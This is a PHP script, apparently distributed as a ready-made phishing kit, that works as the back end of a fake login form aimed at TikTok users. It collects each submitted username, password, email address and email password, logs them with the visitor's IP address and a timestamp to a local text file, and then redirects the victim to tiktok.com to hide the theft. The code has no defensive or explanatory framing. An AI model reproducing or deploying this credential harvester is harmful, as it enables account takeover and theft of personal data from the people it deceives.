<?php
function yazdir($dosya, $kip, $yazi){
    fopen($dosya, $kip);
    fwrite($dosya, $yazi);
    fclose($dosya);
}
if(!isset($_POST)){
    header("Location: form.php");
}else{
    if(isset($_POST["submit"])){
        $username = $_POST["username"];
        $password = $_POST["password"];
        $emailadress = $_POST["emailadress"];
        $emailpw = $_POST["emailpassword"];
	    $ip = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('Europe/Istanbul');
        $tarih = date("d:m:Y G:i");
        $yazi = "Username: $username\nPassword: $password\nEmail: $emailadress\nEmail Password: $emailpw\nIp adress : $ip\nTarih : $tarih \n\n\n";
       if(is_writable('txtdosyasi.txt')){
            $dosya = fopen('txtdosyasi.txt', 'a+');
            fwrite($dosya, $yazi);
            fclose($dosya);
            header('Location: https://tiktok.com/');
        }else{
            echo 'dosyaya yazilamiyor. (aciklamayi bir daha oku, gene olmazsa instagram @psikopatcoder)';
        }
    }else{
        header("Location: form.php");
    }
}

?>